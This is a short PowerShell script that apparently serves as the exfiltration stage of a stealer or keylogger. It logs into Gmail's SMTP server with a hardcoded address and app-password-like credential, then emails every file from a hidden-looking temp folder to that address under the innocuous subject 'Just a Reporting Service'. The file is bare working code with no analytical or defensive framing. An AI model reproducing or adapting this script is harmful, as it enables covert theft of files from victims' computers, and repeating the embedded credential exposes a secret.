$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('enjuloverr@gmail.com', 'ozlr uumd rfkk znfm');
$ReportEmail = New-Object System.Net.Mail.MailMessage
$ReportEmail.From = 'enjuloverr@gmail.com'
$ReportEmail.To.Add('enjuloverr@gmail.com')
$ReportEmail.Subject = 'Just a Reporting Service'
$ReportEmail.Body = '.' 
$files=Get-ChildItem "$env:TEMP\kzldj"
Foreach($file in $files)
{
Write-Host “Attaching File :- ” $file
$attachment = New-Object System.Net.Mail.Attachment –ArgumentList "$env:TEMP\kzldj\$file"
$ReportEmail.Attachments.Add($attachment)
$SMTPInfo.Send($ReportEmail)
}
